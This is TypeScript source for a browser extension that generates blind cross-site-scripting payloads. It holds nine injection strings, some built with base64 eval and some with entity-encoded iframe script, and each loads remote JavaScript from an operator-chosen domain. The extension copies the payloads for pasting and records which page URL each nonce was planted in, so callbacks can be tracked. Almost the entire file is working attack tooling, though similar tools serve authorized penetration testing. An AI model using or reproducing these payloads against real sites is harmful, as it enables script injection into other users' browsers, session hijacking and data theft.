import md5 from "blueimp-md5";

export function renderPayloadRows(count = 9) {
    const container = document.getElementById("payloads");
    if (!container) return;

    const labels = [
        "Import", "Script", "JS-URI", "Input",
        "Img", "Video", "IFrame", "XMLHTTP", "JQuery"
    ];

    for (let i = 0; i < count; i++) {
        const row = document.createElement("div");
        row.className = "payload-row";

        const lbl = document.createElement("label");
        lbl.htmlFor = `payload${i}`;
        lbl.textContent = labels[i] ?? `Payload ${i}`;

        const input = document.createElement("input");
        input.id = `payload${i}`;
        input.name = `payload${i}`;

        const btn = document.createElement("button");
        btn.type = "button";
        btn.id = `copy${i}`;
        btn.textContent = "copy";

        row.append(lbl, input, btn);
        container.appendChild(row);
    }
}

// ----------------------------------------------------------------------------

type Nullable<T> = T | null;

function getEl<T extends HTMLElement>(id: string): T {
    const el = document.getElementById(id);
    if (!el) throw new Error(`Element #${id} not found`);
    return el as T;
}

/* Chrome storage helpers */

export function saveUrlHash(): void {
    const urlInput = getEl<HTMLInputElement>("current-url");
    const hashEl = getEl<HTMLInputElement>("nonce");
    const url = urlInput.value;
    const hash = hashEl.textContent?.trim() ?? "";

    chrome.storage.sync.set({ [url]: hash }, function () {
        console.log(`Saved URL and hash: ${url}, ${hash}`);
    });
}

export function deleteUrlHash(url: string): void {
    chrome.storage.sync.remove(url, function () {
        console.log(`Deleted URL and hash: ${url}`);
    });
}

export function saveDomain(domain: string): void {
    chrome.storage.sync.set({ domain }, function () {
        console.log(`Saved domain: ${domain}`);
    });
}

export function getDomain(callback: (domain: string) => void): void {
    chrome.storage.sync.get("domain", function (items) {
        if ((items as any).domain) {
            callback((items as any).domain as string);
        } else {
            console.log("Domain does not exist in the storage");
        }
    });
}

function entityEncode(str: string): string {
    let result = "";
    for (const char of str) {
        result += `&#${char.charCodeAt(0).toString().padStart(7, "0")};`;
    }
    return result;
}

function copyInputValue(inputId: string, buttonId: string): void {
    const copyButton = getEl<HTMLButtonElement>(buttonId);
    const inputField = getEl<HTMLInputElement | HTMLTextAreaElement>(inputId);

    copyButton.onclick = function () {
        if ("select" in inputField) {
            inputField.select();
        }
        document.execCommand("copy");
        saveUrlHash();
    };
}

/* Payload builder */

export function payloadBuilder(): void {
    const xdomain = getEl<HTMLInputElement>("domain").value;
    const xnonce = getEl<HTMLInputElement>("nonce").value;

    let b64 = `var a=document.createElement("script");a.src="https://${xdomain}?n=${xnonce}";document.body.appendChild(a);`;
    b64 = btoa(b64);

    let h = `<script>var a=parent.document.createElement("script");a.src="https://${xdomain}?n=${xnonce}";parent.document.body.appendChild(a);</script>`;
    h = entityEncode(h);

    const p0 = `"><img src='z' onerror=import('https://${xdomain}?n=${xnonce}')>`;
    const p1 = `"><script src=https://${xdomain}?n=${xnonce}></script>`;
    const p2 = `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://${xdomain}?n=${xnonce}\\';document.body.appendChild(a)')`;
    const p3 = `"><input onfocus=eval(atob(this.id)) id=${b64} autofocus>`;
    const p4 = `"><img src=x id=${b64} onerror=eval(atob(this.id))>`;
    const p5 = `"><video><source onerror=eval(atob(this.id)) id=${b64}>`;
    const p6 = `"><iframe srcdoc="${h}">`;
    const p7 = `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//${xdomain}?n=${xnonce}");a.send();</script>`;
    const p8 = `<script>$.getScript("//${xdomain}?n=${xnonce}")</script>`;

    getEl<HTMLInputElement>("payload0").value = p0;
    getEl<HTMLInputElement>("payload1").value = p1;
    getEl<HTMLInputElement>("payload2").value = p2;
    getEl<HTMLInputElement>("payload3").value = p3;
    getEl<HTMLInputElement>("payload4").value = p4;
    getEl<HTMLInputElement>("payload5").value = p5;
    getEl<HTMLInputElement>("payload6").value = p6;
    getEl<HTMLInputElement>("payload7").value = p7;
    getEl<HTMLInputElement>("payload8").value = p8;
}

export function copyBuild(): void {
    copyInputValue("payload0", "copy0");
    copyInputValue("payload1", "copy1");
    copyInputValue("payload2", "copy2");
    copyInputValue("payload3", "copy3");
    copyInputValue("payload4", "copy4");
    copyInputValue("payload5", "copy5");
    copyInputValue("payload6", "copy6");
    copyInputValue("payload7", "copy7");
    copyInputValue("payload8", "copy8");
}

export function writeStorageDataToDiv(divId: string): void {
    chrome.storage.sync.get(null, (items: Record<string, any>) => {
        const div = document.getElementById(divId);
        if (!div) return;

        let html = `
                    <table style="
                        width: 100%;
                        border-collapse: collapse;
                        font-family: monospace;
                        color: white;
                        background: #434343;
                    ">
                    <thead>
                        <tr style="color: white;">
                            <th style="padding: 6px; text-align: left;">URL</th>
                            <th style="padding: 6px; text-align: left;">HASH</th>
                        </tr>
                    </thead>
                    <tbody>
                `;

        for (const key in items) {
            if (!Object.prototype.hasOwnProperty.call(items, key)) continue;

            const value = items[key];

            if (
                key === "domain" ||
                (typeof value === "object" && value !== null && "selectors" in value)
            ) {
                continue;
            }

            html += `
                    <tr>
                        <td style="padding: 6px; border-bottom: 1px solid #333;">${value}</td>
                        <td style="padding: 6px; border-bottom: 1px solid #333;">${key}</td>
                    </tr>
                `;
        }

        html += "</tbody></table>";
        div.innerHTML = html;
    });
}

export function clearSyncStorage(): void {
    const keepKeys = ["domain"];

    chrome.storage.sync.get(null, (items: Record<string, any>) => {
        const toRemove = Object.keys(items).filter((key) => {
            const value = items[key];

            if (keepKeys.includes(key)) return false;

            if (typeof value === "object" && value !== null && "selectors" in value) {
                return false;
            }

            return true;
        });

        if (toRemove.length > 0) {
            chrome.storage.sync.remove(toRemove, () => {
                console.log("Removed keys:", toRemove);
            });
        }
    });
}


// ----------------------------------------------------------------------------

function generateUrlHash(): void {
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
        const currentUrl = tabs[0]?.url;
        if (!currentUrl) return;

        const hash = md5(currentUrl).substring(0, 6);
        const nonceInput = document.getElementById("nonce");
        if (nonceInput) nonceInput.textContent = hash;
    });
}

function captureCurrentUrl(): void {
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
        const currentUrl = tabs[0]?.url;
        if (!currentUrl) return;

        const urlInput = document.getElementById("current-url") as HTMLInputElement | null;
        if (urlInput) urlInput.value = currentUrl;
    });
}

function toload(): void {
    captureCurrentUrl();
    generateUrlHash();

    getDomain((domain) => {
        const domainInput = document.getElementById("domain") as HTMLInputElement | null;
        if (domainInput) domainInput.value = domain;
        payloadBuilder();
    });

    const btn = document.getElementById("saveDomainButton") as HTMLButtonElement | null;
    if (btn) {
        btn.onclick = () => {
            const domainValue = (document.getElementById("domain") as HTMLInputElement)?.value || "";
            saveDomain(domainValue);
        };
    }

    copyBuild();
}

window.onload = toload;
